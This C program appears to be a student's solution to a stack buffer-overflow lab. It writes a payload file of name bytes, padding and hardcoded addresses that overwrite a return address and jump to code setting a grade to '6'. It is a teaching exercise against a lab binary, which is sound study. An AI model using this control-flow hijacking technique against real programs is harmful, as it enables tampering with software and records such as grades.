#include <stdio.h>
#include <stdlib.h>

int main(){

	FILE *data6;
	int i;
	
	if ((data6 = fopen("data6", "w")) == NULL){
		fprintf(stderr, "\nERROR\n");
		exit(1);
	}

	fprintf(data6, "Nikolaos Giovanopoulos");	/* 22 characters */

	fputc('\0', data6);	/* end of name */

	for (i = 0; i < 25; i++){fputc('\0', data6);}	/* 21 empty cells of buffer + 4 old_ebp */

	fputc('8', data6);		/* '8'==56 (buf[56] points to ret address)*/
	fputc('\x61', data6);	/* overwriting return address */
	fputc('\x8b', data6);	/* address of instruction : grade = '6' [0x8048b61] */
	fputc('\x04', data6);
	fputc('\x08', data6);
	
	fputc('\xe0', data6);	/* address of string Name [0x80d65e0] to rewrite adress of readString argument to not be destroyed*/
	fputc('\x65', data6);
	fputc('\x0d', data6);
	fputc('\x08', data6);

	fclose(data6);

	return 0;
}